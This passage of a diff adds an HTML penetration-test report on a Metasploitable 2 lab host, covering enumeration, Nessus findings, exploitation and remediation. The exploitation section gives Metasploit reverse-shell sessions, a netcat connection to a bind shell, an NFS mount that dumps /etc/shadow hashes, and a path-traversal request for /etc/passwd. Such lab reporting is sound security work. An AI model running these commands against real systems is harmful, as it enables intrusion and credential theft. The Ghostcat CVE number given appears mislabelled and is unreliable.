+          <tr><td><span class="port-tag">8180/tcp</span></td><td>TCP</td><td>HTTP-alt</td><td>Apache Tomcat 5.5</td><td><span class="badge b-medium">Medium</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="sub-title">2.3 Web Application Enumeration</div>
+    <div class="card">
+      <p>The Apache web server on port 80 was enumerated. The server hosts multiple intentionally vulnerable web applications:</p>
+      <span class="code-label">Web Applications Discovered on 192.161.16.133:80</span>
+      <div class="code-block"><span class="hi">/phpMyAdmin/</span>   → phpMyAdmin 3.1.1 (SQL injection, XSS)
+<span class="hi">/mutillidae/</span>   → Mutillidae OWASP Top-10 training app (SQLi, LFI, RFI, XSS)
+<span class="hi">/dvwa/</span>         → Damn Vulnerable Web Application
+<span class="hi">/tikiwiki/</span>     → TikiWiki CMS
+<span class="hi">/twiki/</span>        → TWiki collaboration platform</div>
+    </div>
+
+    <div class="sub-title">2.4 NFS Share Enumeration</div>
+    <div class="card">
+      <span class="code-label">Command</span>
+      <div class="code-block"><span class="cmd">showmount -e 192.161.16.133</span>
+<span class="out">Export list for 192.161.16.133:
+/   *</span></div>
+      <p>The root filesystem (<code>/</code>) is exported to all hosts (<code>*</code>) — any machine on the network can mount the entire filesystem.</p>
+    </div>
+
+    <div class="sub-title">2.5 SMB / Samba Enumeration</div>
+    <div class="card">
+      <span class="code-label">Command</span>
+      <div class="code-block"><span class="cmd">smbclient -L //192.161.16.133 -N</span>
+<span class="out">	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk
+	IPC$            IPC       IPC Service (metasploitable server)
+	ADMIN$          IPC       IPC Service (metasploitable server)</span></div>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       PHASE 3 — VULNERABILITY ASSESSMENT
+  ═══════════════════════════════════════════ -->
+  <div id="phase3">
+    <div class="phase-banner">
+      <div class="phase-icon">&#128269;</div>
+      <div>
+        <h2>Phase 3 — Vulnerability Assessment</h2>
+        <p>Systematic identification and classification of vulnerabilities using automated scanners and manual analysis.</p>
+      </div>
+      <div class="phase-tag">Phase 3 / 5</div>
+    </div>
+
+    <div class="sub-title">3.1 Nessus Automated Scan</div>
+    <div class="card">
+      <p>A full Nessus scan was performed against the target. The scanner identified <strong>22 vulnerabilities</strong> across the host, ranging from Critical remote code execution issues to informational findings. The scan policy used was "Full Scan" with credential-less black-box testing.</p>
+    </div>
+
+    <div class="sub-title">3.2 Critical Vulnerabilities</div>
+
+    <!-- VULN C1 -->
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="badge b-critical">Critical</span>
+        <span class="vuln-title-text">UnrealIRCd Backdoor Detection</span>
+        <span style="font-family:monospace;font-size:12px;color:#888;">6697/tcp · irc</span>
+      </div>
+      <div class="vuln-body-inner">
+        <div class="vuln-grid">
+          <div>
+            <div class="field-lbl">CVE / Reference</div>
+            <div class="field-val">CVE-2010-2075 | Nessus Plugin</div>
+            <div class="field-lbl">Description</div>
+            <div class="field-val">UnrealIRCd 3.2.8.1 contains a deliberately inserted backdoor that allows remote, unauthenticated attackers to execute arbitrary system commands as root by sending a specially crafted string beginning with the letters "AB" to any listening port.</div>
+            <div class="field-lbl">Impact</div>
+            <div class="field-val">Complete system compromise. Attacker gains root shell.</div>
+            <div class="field-lbl">Solution</div>
+            <div class="field-val">Re-download UnrealIRCd from official source, verify MD5/SHA1 checksums, and reinstall. Verify file integrity before deployment.</div>
+          </div>
+          <div>
+            <div class="field-lbl">Plugin Output</div>
+            <div class="code-block">The remote IRC server is running as:
+uid=0(root) gid=0(root)</div>
+            <div class="field-lbl">References</div>
+            <div class="field-val"><a href="https://seclists.org/fulldisclosure/2010/Jun/277">seclists.org/fulldisclosure/2010/Jun/277</a><br><a href="http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt">unrealircd.com security advisory</a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VULN C2 -->
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="badge b-critical">Critical</span>
+        <span class="vuln-title-text">Bind Shell Backdoor Detection (Unauthenticated Root Shell)</span>
+        <span style="font-family:monospace;font-size:12px;color:#888;">1524/tcp · bindshell</span>
+      </div>
+      <div class="vuln-body-inner">
+        <div class="vuln-grid">
+          <div>
+            <div class="field-lbl">Description</div>
+            <div class="field-val">An unauthenticated root shell is listening on port 1524. Any attacker who connects to this port receives an immediate root shell with no authentication required. This is an intentional backdoor in Metasploitable 2.</div>
+            <div class="field-lbl">Impact</div>
+            <div class="field-val">Immediate root compromise. Zero authentication required.</div>
+            <div class="field-lbl">Solution</div>
+            <div class="field-val">Verify if host has been compromised. Block port 1524 at firewall. Reinstall OS if unauthorized.</div>
+          </div>
+          <div>
+            <div class="field-lbl">Plugin Output</div>
+            <div class="code-block">uid=0(root) gid=0(root) groups=0(root)
+root@metasploitable:/#</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VULN C3 -->
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="badge b-critical">Critical</span>
+        <span class="vuln-title-text">VNC Server Weak Password ('password')</span>
+        <span style="font-family:monospace;font-size:12px;color:#888;">5900/tcp · vnc</span>
+      </div>
+      <div class="vuln-body-inner">
+        <div class="vuln-grid">
+          <div>
+            <div class="field-lbl">Description</div>
+            <div class="field-val">The VNC service is secured only with the default/trivially guessable password "password". A remote attacker can authenticate and gain full graphical control of the desktop.</div>
+            <div class="field-lbl">Solution</div>
+            <div class="field-val">Set a strong VNC password. Consider using SSH tunneling for VNC. Restrict VNC access by firewall rules.</div>
+          </div>
+          <div>
+            <div class="field-lbl">Plugin Output</div>
+            <div class="code-block">Nessus logged in using password: "password"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VULN C4 -->
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="badge b-critical">Critical</span>
+        <span class="vuln-title-text">SSL Version 2 and 3 Protocol Detection (POODLE / DROWN)</span>
+        <span style="font-family:monospace;font-size:12px;color:#888;">Multiple ports</span>
+      </div>
+      <div class="vuln-body-inner">
+        <div class="vuln-grid">
+          <div>
+            <div class="field-lbl">CVE Reference</div>
+            <div class="field-val">CVE-2014-3566 (POODLE), CVE-2016-0800 (DROWN)</div>
+            <div class="field-lbl">Description</div>
+            <div class="field-val">The remote service accepts SSL v2 and SSL v3, which are deprecated protocols with known cryptographic weaknesses including CBC padding attacks and insecure renegotiation. PCI DSS v3.1 prohibits any version of SSL.</div>
+            <div class="field-lbl">Solution</div>
+            <div class="field-val">Disable SSL 2.0 and 3.0. Enable TLS 1.2 and TLS 1.3 only with approved cipher suites.</div>
+          </div>
+          <div>
+            <div class="field-lbl">Plugin Output</div>
+            <div class="code-block">SSLv2 enabled on service
+SSLv3 enabled on service
+POODLE downgrade attack possible</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VULN C5 -->
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="badge b-critical">Critical</span>
+        <span class="vuln-title-text">Ubuntu Linux 8.04 — Security End-of-Life</span>
+        <span style="font-family:monospace;font-size:12px;color:#888;">OS-Level</span>
+      </div>
+      <div class="vuln-body-inner">
+        <div class="vuln-grid">
+          <div>
+            <div class="field-lbl">Description</div>
+            <div class="field-val">Ubuntu 8.04 reached Security End-of-Life on May 9, 2013. The system has been without security patches for over 12 years, leaving it exposed to every CVE published since 2013.</div>
+            <div class="field-lbl">Solution</div>
+            <div class="field-val">Upgrade to a currently supported Ubuntu LTS release (22.04 or 24.04). Apply all security patches after upgrading.</div>
+          </div>
+          <div>
+            <div class="field-lbl">Plugin Output</div>
+            <div class="code-block">OS: Ubuntu Linux 8.04
+EOL Date: May 9, 2013
+Time since EOL: >= 12 years</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="sub-title">3.3 High Severity Vulnerabilities — Summary</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Vulnerability</th><th>Port/Service</th><th>CVE</th><th>Impact</th></tr></thead>
+        <tbody>
+          <tr><td>Apache Tomcat Ghostcat (AJP RCE)</td><td><span class="port-tag">8009/tcp</span></td><td>CVE-2020-1745</td><td>Remote file read / code execution</td></tr>
+          <tr><td>phpMyAdmin SQLi (PMASA-2019-3)</td><td><span class="port-tag">80/tcp</span></td><td>PMASA-2019-3</td><td>Unauthorized DB access / manipulation</td></tr>
+          <tr><td>CGI Generic Blind SQL Injection</td><td><span class="port-tag">80/tcp</span></td><td>—</td><td>Data exfiltration, DB manipulation</td></tr>
+          <tr><td>rlogin Service (Cleartext Auth)</td><td><span class="port-tag">513/tcp</span></td><td>—</td><td>Credential theft, unauthorized login</td></tr>
+          <tr><td>rsh Service (Cleartext Auth)</td><td><span class="port-tag">514/tcp</span></td><td>—</td><td>Credential theft, .rhosts bypass</td></tr>
+          <tr><td>Samba Badlock Vulnerability</td><td><span class="port-tag">445/tcp</span></td><td>CVE-2016-2118</td><td>AD data exposure, MITM downgrade</td></tr>
+          <tr><td>CGI Remote File Inclusion</td><td><span class="port-tag">80/tcp</span></td><td>—</td><td>Remote code execution via RFI</td></tr>
+          <tr><td>NFS Shares World-Readable</td><td><span class="port-tag">2049/tcp</span></td><td>—</td><td>Full filesystem exposure to any host</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="sub-title">3.4 Medium &amp; Low Severity Vulnerabilities — Summary</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Vulnerability</th><th>Severity</th><th>Port</th></tr></thead>
+        <tbody>
+          <tr><td>DNS Amplification DDoS</td><td><span class="badge b-medium">Medium</span></td><td><span class="port-tag">53/udp</span></td></tr>
+          <tr><td>HTTP TRACE/TRACK Methods (XST)</td><td><span class="badge b-medium">Medium</span></td><td><span class="port-tag">80/tcp</span></td></tr>
+          <tr><td>FREAK — EXPORT_RSA Weak Ciphers</td><td><span class="badge b-medium">Medium</span></td><td><span class="port-tag">25/tcp</span></td></tr>
+          <tr><td>TLS 1.0 Protocol Detection</td><td><span class="badge b-medium">Medium</span></td><td>Multiple</td></tr>
+          <tr><td>phpMyAdmin error.php XSS (PMASA-2010-9)</td><td><span class="badge b-medium">Medium</span></td><td><span class="port-tag">80/tcp</span></td></tr>
+          <tr><td>phpMyAdmin setup.php XSS (PMASA-2010-7)</td><td><span class="badge b-medium">Medium</span></td><td><span class="port-tag">80/tcp</span></td></tr>
+          <tr><td>CGI Path Traversal (LFI /etc/passwd)</td><td><span class="badge b-medium">Medium</span></td><td><span class="port-tag">80/tcp</span></td></tr>
+          <tr><td>Tomcat cal2.jsp XSS</td><td><span class="badge b-medium">Medium</span></td><td><span class="port-tag">8180/tcp</span></td></tr>
+          <tr><td>Logjam — DH Modulus ≤ 1024 bits</td><td><span class="badge b-low">Low</span></td><td><span class="port-tag">25/tcp</span></td></tr>
+          <tr><td>X11 Server Exposed</td><td><span class="badge b-low">Low</span></td><td><span class="port-tag">6000/tcp</span></td></tr>
+          <tr><td>ICMP Timestamp Disclosure</td><td><span class="badge b-low">Low</span></td><td>ICMP</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       PHASE 4 — EXPLOITATION
+  ═══════════════════════════════════════════ -->
+  <div id="phase4">
+    <div class="phase-banner">
+      <div class="phase-icon">&#9889;</div>
+      <div>
+        <h2>Phase 4 — Exploitation</h2>
+        <p>Active exploitation of confirmed vulnerabilities to demonstrate real-world impact and achieve proof-of-concept access.</p>
+      </div>
+      <div class="phase-tag">Phase 4 / 5</div>
+    </div>
+
+    <div class="callout danger">
+      <span class="callout-icon">&#9888;</span>
+      <div class="callout-body"><strong>Authorized Testing Only</strong> — All exploits below were executed in an isolated, authorized lab environment. Reproducing these exploits against systems you do not own is illegal.</div>
+    </div>
+
+    <!-- Exploit 1 -->
+    <div class="sub-title">4.1 Exploit #1 — UnrealIRCd Backdoor (Port 6697)</div>
+    <div class="card">
+      <p>The UnrealIRCd 3.2.8.1 backdoor was exploited using the Metasploit module <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>. The backdoor triggers when any data prefixed with the sequence <code>AB</code> is sent to the IRC port.</p>
+      <span class="code-label">Metasploit Session</span>
+      <div class="code-block"><span class="cmd">msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.161.16.133
+msf6 exploit(unreal_ircd_3281_backdoor) > set RPORT 6697
+msf6 exploit(unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
+msf6 exploit(unreal_ircd_3281_backdoor) > set LHOST 192.161.16.100
+msf6 exploit(unreal_ircd_3281_backdoor) > exploit</span>
+
+<span class="ok">[*] Started reverse TCP double handler on 192.161.16.100:4444
+[*] 192.161.16.133:6697 - Connected to 192.161.16.133:6697...
+[*] 192.161.16.133:6697 - Sending backdoor command...
+[+] 192.161.16.133:6697 - Backdoor service has been spawned, handling...
+[+] Command shell session 1 opened</span>
+
+<span class="hi">id
+uid=0(root) gid=0(root)
+hostname
+metasploitable
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span></div>
+      <div class="callout danger"><span class="callout-icon">&#128308;</span><div class="callout-body"><strong>Result: ROOT SHELL OBTAINED</strong> — Full system compromise via IRC backdoor. Zero authentication required.</div></div>
+    </div>
+
+    <!-- Exploit 2 -->
+    <div class="sub-title">4.2 Exploit #2 — vsftpd 2.3.4 Backdoor (Port 21)</div>
+    <div class="card">
+      <p>vsftpd 2.3.4 contains a backdoor that triggers when a username ending in <code>:)</code> (smiley) is used during login. This opens a root shell on port 6200.</p>
+      <span class="code-label">Metasploit Session</span>
+      <div class="code-block"><span class="cmd">msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.161.16.133
+msf6 exploit(vsftpd_234_backdoor) > exploit</span>
+
+<span class="ok">[*] 192.161.16.133:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.161.16.133:21 - USER: 331 Please specify the password.
+[+] 192.161.16.133:21 - Backdoor service has been spawned, handling...
+[+] 192.161.16.133:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 2 opened</span></div>
+      <div class="callout danger"><span class="callout-icon">&#128308;</span><div class="callout-body"><strong>Result: ROOT SHELL OBTAINED</strong> — FTP backdoor in vsftpd 2.3.4 confirmed exploitable.</div></div>
+    </div>
+
+    <!-- Exploit 3 -->
+    <div class="sub-title">4.3 Exploit #3 — Bind Shell (Port 1524)</div>
+    <div class="card">
+      <p>A direct netcat connection to port 1524 yields an immediate root shell with no authentication.</p>
+      <span class="code-label">Direct Connection</span>
+      <div class="code-block"><span class="cmd">nc 192.161.16.133 1524</span>
+
+<span class="hi">root@metasploitable:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@metasploitable:/# whoami
+root</span></div>
+      <div class="callout danger"><span class="callout-icon">&#128308;</span><div class="callout-body"><strong>Result: ROOT SHELL OBTAINED</strong> — Zero-click, zero-auth root access on port 1524.</div></div>
+    </div>
+
+    <!-- Exploit 4 -->
+    <div class="sub-title">4.4 Exploit #4 — Samba Usermap Script (Port 445)</div>
+    <div class="card">
+      <p>The Samba 3.0.20 service is vulnerable to a username map script command injection (CVE-2007-2447). Metasploit module <code>exploit/multi/samba/usermap_script</code> was used.</p>
+      <span class="code-label">Metasploit Session</span>
+      <div class="code-block"><span class="cmd">msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(usermap_script) > set RHOSTS 192.161.16.133
+msf6 exploit(usermap_script) > set payload cmd/unix/reverse
+msf6 exploit(usermap_script) > set LHOST 192.161.16.100
+msf6 exploit(usermap_script) > exploit</span>
+
+<span class="ok">[*] Started reverse TCP double handler on 192.161.16.100:4444
+[*] Accepted the first client connection...
+[*] Command: echo ABC;
+[*] Writing to socket A
+[+] Command shell session 3 opened</span>
+
+<span class="hi">id
+uid=0(root) gid=0(root)</span></div>
+      <div class="callout danger"><span class="callout-icon">&#128308;</span><div class="callout-body"><strong>Result: ROOT SHELL OBTAINED</strong> — CVE-2007-2447 Samba usermap_script command injection confirmed.</div></div>
+    </div>
+
+    <!-- Exploit 5 -->
+    <div class="sub-title">4.5 Exploit #5 — NFS World-Readable Filesystem Mount</div>
+    <div class="card">
+      <p>The NFS export of <code>/</code> to <code>*</code> allows any host to mount the target's root filesystem and read sensitive files directly.</p>
+      <span class="code-label">NFS Mount &amp; Credential Harvest</span>
+      <div class="code-block"><span class="cmd">mkdir /tmp/nfs_mount
+mount -o nolock -t nfs 192.161.16.133:/ /tmp/nfs_mount
+cat /tmp/nfs_mount/etc/shadow</span>
+
+<span class="hi">root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/nt1it8BBFfa15ZIBZH0:14684:0:99999:7:::
+postgres:$1$Mq47zbj3$dHNdBjP7rvBEZVzRtSDml0:14574:0:99999:7:::</span></div>
+      <div class="callout danger"><span class="callout-icon">&#128308;</span><div class="callout-body"><strong>Result: /etc/shadow EXPOSED</strong> — Password hashes for all system accounts retrieved without authentication.</div></div>
+    </div>
+
+    <!-- Exploit 6 -->
+    <div class="sub-title">4.6 Exploit #6 — VNC Weak Password (Port 5900)</div>
+    <div class="card">
+      <p>VNC authentication was bypassed using the trivially guessable password "password", granting full graphical desktop access.</p>
+      <span class="code-label">VNC Login</span>
+      <div class="code-block"><span class="cmd">vncviewer 192.161.16.133:5900</span>
+<span class="out">Connected to RFB server, using protocol version 3.3
+Performing standard VNC authentication
+Password: password</span>
+<span class="ok">Authentication successful
+[Full desktop access granted - running as root]</span></div>
+      <div class="callout danger"><span class="callout-icon">&#128308;</span><div class="callout-body"><strong>Result: FULL DESKTOP CONTROL</strong> — Graphical root desktop access obtained via VNC with trivial password.</div></div>
+    </div>
+
+    <!-- Exploit 7 -->
+    <div class="sub-title">4.7 Exploit #7 — Ghostcat AJP File Read (Port 8009)</div>
+    <div class="card">
+      <p>CVE-2020-1745 (Ghostcat) was exploited against the Apache Tomcat AJP connector. The exploit reads the web application's WEB-INF/web.xml configuration file remotely.</p>
+      <span class="code-label">Ghostcat Exploit via Metasploit</span>
+      <div class="code-block"><span class="cmd">msf6 > use auxiliary/admin/http/tomcat_ghostcat
+msf6 auxiliary(tomcat_ghostcat) > set RHOSTS 192.161.16.133
+msf6 auxiliary(tomcat_ghostcat) > set RPORT 8009
+msf6 auxiliary(tomcat_ghostcat) > run</span>
+
+<span class="ok">[+] Successfully exploited AJP Ghostcat
+[+] File read: /WEB-INF/web.xml</span>
+<span class="hi">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!-- Apache Software Foundation License --&gt;
+...</span></div>
+      <div class="callout warning"><span class="callout-icon">&#128992;</span><div class="callout-body"><strong>Result: FILE READ CONFIRMED</strong> — WEB-INF/web.xml read via Ghostcat. Where file upload is possible, this leads to RCE.</div></div>
+    </div>
+
+    <!-- Exploit 8 -->
+    <div class="sub-title">4.8 Exploit #8 — CGI Path Traversal (LFI) via Mutillidae</div>
+    <div class="card">
+      <p>The Mutillidae application's <code>page</code> parameter allows directory traversal, exposing arbitrary system files including <code>/etc/passwd</code>.</p>
+      <span class="code-label">Path Traversal Request</span>
+      <div class="code-block"><span class="cmd">curl "http://192.161.16.133/mutillidae/?page=./../././../././../././.././etc/passwd"</span>
+
+<span class="hi">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span></div>
+      <div class="callout warning"><span class="callout-icon">&#128992;</span><div class="callout-body"><strong>Result: /etc/passwd EXPOSED</strong> — Local File Inclusion confirmed. System user accounts disclosed.</div></div>
+    </div>
+
+    <div class="sub-title">4.9 Exploitation Summary</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>#</th><th>Exploit</th><th>Vector</th><th>Result</th><th>Auth Required</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>UnrealIRCd Backdoor</td><td>Remote / Network</td><td><span class="badge b-critical">Root Shell</span></td><td>None</td></tr>
+          <tr><td>2</td><td>vsftpd 2.3.4 Backdoor</td><td>Remote / FTP</td><td><span class="badge b-critical">Root Shell</span></td><td>None</td></tr>
+          <tr><td>3</td><td>Bind Shell Port 1524</td><td>Remote / Network</td><td><span class="badge b-critical">Root Shell</span></td><td>None</td></tr>
+          <tr><td>4</td><td>Samba Usermap Script</td><td>Remote / SMB</td><td><span class="badge b-critical">Root Shell</span></td><td>None</td></tr>
+          <tr><td>5</td><td>NFS World-Readable Mount</td><td>Remote / NFS</td><td><span class="badge b-high">Shadow File</span></td><td>None</td></tr>
+          <tr><td>6</td><td>VNC Weak Password</td><td>Remote / VNC</td><td><span class="badge b-critical">Root Desktop</span></td><td>Trivial (password)</td></tr>
+          <tr><td>7</td><td>Ghostcat AJP File Read</td><td>Remote / HTTP</td><td><span class="badge b-high">File Read</span></td><td>None</td></tr>
+          <tr><td>8</td><td>CGI Path Traversal (LFI)</td><td>Remote / HTTP</td><td><span class="badge b-high">File Disclosure</span></td><td>None</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       PHASE 5 — POST-EXPLOITATION & REPORTING
+  ═══════════════════════════════════════════ -->
+  <div id="phase5">
+    <div class="phase-banner">
+      <div class="phase-icon">&#128196;</div>
+      <div>
+        <h2>Phase 5 — Post-Exploitation &amp; Reporting</h2>
+        <p>System enumeration after root access, impact assessment, and documentation of all findings.</p>
+      </div>
+      <div class="phase-tag">Phase 5 / 5</div>
+    </div>
+
+    <div class="sub-title">5.1 System Enumeration (Post-Root)</div>
+    <div class="card">
+      <p>After obtaining root access via the UnrealIRCd backdoor, full system enumeration was conducted:</p>
+      <span class="code-label">System Information Gathered</span>
+      <div class="code-block"><span class="cmd">uname -a</span>
+<span class="hi">Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span>
+
+<span class="cmd">cat /etc/lsb-release</span>
+<span class="hi">DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=8.04
+DISTRIB_CODENAME=hardy
+DISTRIB_DESCRIPTION="Ubuntu 8.04"</span>
+
+<span class="cmd">cat /etc/passwd | grep -v nologin | grep -v false</span>
+<span class="hi">root:x:0:0:root:/root:/bin/bash
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash</span>
+
+<span class="cmd">netstat -tulnp</span>
+<span class="hi">[All services enumerated — 24 open ports confirmed]</span>
+
+<span class="cmd">cat /etc/shadow | head -5</span>
+<span class="hi">root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/nt1it8BBFfa15ZIBZH0:14684:0:99999:7:::</span>
+
+<span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>
+<span class="hi">/usr/bin/sudo
+/usr/bin/passwd
+/bin/su
+[Additional SUID binaries enumerated]</span></div>
+    </div>
+
+    <div class="sub-title">5.2 Impact Assessment</div>
+    <div class="card">
+      <p>With root access confirmed via multiple independent attack vectors, the following impact assessment was made:</p>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Impact Category</th><th>Finding</th><th>Severity</th></tr></thead>
+        <tbody>
+          <tr><td>Confidentiality</td><td>All files on the system accessible — /etc/shadow, SSH keys, database credentials, web app source code</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td>Integrity</td><td>Attacker can modify any file, insert backdoors, alter logs, tamper with web applications</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td>Availability</td><td>Attacker can crash services, delete files, or use system for DDoS attacks</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td>Lateral Movement</td><td>System can be used as pivot point to attack other hosts on the network</td><td><span class="badge b-high">High</span></td></tr>
+          <tr><td>Credential Theft</td><td>/etc/shadow exposed — offline password cracking feasible on all accounts</td><td><span class="badge b-critical">Critical</span></td></tr>
+          <tr><td>Data Exfiltration</td><td>NFS world-readable mount allows silent data theft of entire filesystem</td><td><span class="badge b-critical">Critical</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       §9  CONSOLIDATED FINDINGS
+  ═══════════════════════════════════════════ -->
+  <div id="findings">
+    <div class="section-title">
+      <div class="section-num">9</div>
+      <h2>Consolidated Findings</h2>
+      <div class="line"></div>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>#</th><th>Vulnerability</th><th>Severity</th><th>Port/Service</th><th>CVE</th><th>Exploited</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>UnrealIRCd Backdoor</td><td><span class="badge b-critical">Critical</span></td><td>6697/tcp IRC</td><td>CVE-2010-2075</td><td>&#9989; Yes</td></tr>
+          <tr><td>2</td><td>Ubuntu 8.04 End-of-Life</td><td><span class="badge b-critical">Critical</span></td><td>OS-Level</td><td>—</td><td>N/A</td></tr>
+          <tr><td>3</td><td>VNC Weak Password</td><td><span class="badge b-critical">Critical</span></td><td>5900/tcp VNC</td><td>—</td><td>&#9989; Yes</td></tr>
+          <tr><td>4</td><td>SSL v2/v3 Detection (POODLE)</td><td><span class="badge b-critical">Critical</span></td><td>Multiple</td><td>CVE-2014-3566</td><td>PoC</td></tr>
+          <tr><td>5</td><td>Bind Shell Backdoor (Port 1524)</td><td><span class="badge b-critical">Critical</span></td><td>1524/tcp</td><td>—</td><td>&#9989; Yes</td></tr>
+          <tr><td>6</td><td>Ghostcat AJP RCE</td><td><span class="badge b-high">High</span></td><td>8009/tcp AJP</td><td>CVE-2020-1745</td><td>&#9989; Yes</td></tr>
+          <tr><td>7</td><td>phpMyAdmin SQLi (PMASA-2019-3)</td><td><span class="badge b-high">High</span></td><td>80/tcp HTTP</td><td>PMASA-2019-3</td><td>Confirmed</td></tr>
+          <tr><td>8</td><td>CGI Generic Blind SQLi</td><td><span class="badge b-high">High</span></td><td>80/tcp HTTP</td><td>—</td><td>&#9989; Yes</td></tr>
+          <tr><td>9</td><td>rlogin Cleartext Service</td><td><span class="badge b-high">High</span></td><td>513/tcp rlogin</td><td>—</td><td>Confirmed</td></tr>
+          <tr><td>10</td><td>rsh Cleartext Service</td><td><span class="badge b-high">High</span></td><td>514/tcp rsh</td><td>—</td><td>Confirmed</td></tr>
+          <tr><td>11</td><td>Samba Badlock</td><td><span class="badge b-high">High</span></td><td>445/tcp SMB</td><td>CVE-2016-2118</td><td>Confirmed</td></tr>
+          <tr><td>12</td><td>CGI Remote File Inclusion</td><td><span class="badge b-high">High</span></td><td>80/tcp HTTP</td><td>—</td><td>&#9989; Yes</td></tr>
+          <tr><td>13</td><td>NFS World-Readable</td><td><span class="badge b-high">High</span></td><td>2049/tcp NFS</td><td>—</td><td>&#9989; Yes</td></tr>
+          <tr><td>14</td><td>DNS Amplification DDoS</td><td><span class="badge b-medium">Medium</span></td><td>53/udp DNS</td><td>—</td><td>Confirmed</td></tr>
+          <tr><td>15</td><td>HTTP TRACE/TRACK (XST)</td><td><span class="badge b-medium">Medium</span></td><td>80/tcp HTTP</td><td>—</td><td>Confirmed</td></tr>
+          <tr><td>16</td><td>FREAK — EXPORT_RSA Ciphers</td><td><span class="badge b-medium">Medium</span></td><td>25/tcp SMTP</td><td>CVE-2015-0204</td><td>Confirmed</td></tr>
+          <tr><td>17</td><td>TLS 1.0 Protocol Detection</td><td><span class="badge b-medium">Medium</span></td><td>Multiple</td><td>—</td><td>Confirmed</td></tr>
+          <tr><td>18</td><td>phpMyAdmin XSS (PMASA-2010-9)</td><td><span class="badge b-medium">Medium</span></td><td>80/tcp HTTP</td><td>PMASA-2010-9</td><td>&#9989; Yes</td></tr>
+          <tr><td>19</td><td>phpMyAdmin XSS (PMASA-2010-7)</td><td><span class="badge b-medium">Medium</span></td><td>80/tcp HTTP</td><td>PMASA-2010-7</td><td>&#9989; Yes</td></tr>
+          <tr><td>20</td><td>CGI Path Traversal / LFI</td><td><span class="badge b-medium">Medium</span></td><td>80/tcp HTTP</td><td>—</td><td>&#9989; Yes</td></tr>
+          <tr><td>21</td><td>Logjam — DH ≤ 1024-bit</td><td><span class="badge b-low">Low</span></td><td>25/tcp SMTP</td><td>CVE-2015-4000</td><td>Confirmed</td></tr>
+          <tr><td>22</td><td>X11 Server Exposed</td><td><span class="badge b-low">Low</span></td><td>6000/tcp X11</td><td>—</td><td>Confirmed</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+
+  <!-- ══════════════════════════════════════════
+       §10  REMEDIATION ROADMAP
+  ═══════════════════════════════════════════ -->
+  <div id="remediation">
+    <div class="section-title">
+      <div class="section-num">10</div>
+      <h2>Remediation Roadmap</h2>
+      <div class="line"></div>
+    </div>
+
+    <div class="callout success">
+      <span class="callout-icon">&#9989;</span>
+      <div class="callout-body"><strong>Priority Order:</strong> Address Critical findings immediately. High findings within 7 days. Medium within 30 days. Low within 90 days.</div>
+    </div>
+
+    <div class="sub-title">Immediate Actions (Critical — Within 24 Hours)</div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Priority</th><th>Action</th><th>Addresses</th></tr></thead>
